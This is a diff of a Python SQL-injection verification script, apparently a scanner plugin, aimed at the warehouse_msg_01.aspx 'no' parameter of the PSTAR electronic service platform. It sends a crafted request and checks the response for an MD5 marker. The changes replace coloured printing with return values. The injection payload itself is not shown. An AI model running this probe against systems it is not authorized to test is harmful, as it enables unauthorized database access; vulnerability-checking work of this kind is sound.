@@ -8,8 +8,8 @@ description: 文件/HyperLink/warehouse_msg_01.aspx?type=A&no=,no参数存在SQL
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class pstar_warehouse_msg_01_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class pstar_warehouse_msg_01_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在PSTAR-电子服务平台SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在PSTAR-电子服务平台SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = pstar_warehouse_msg_01_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
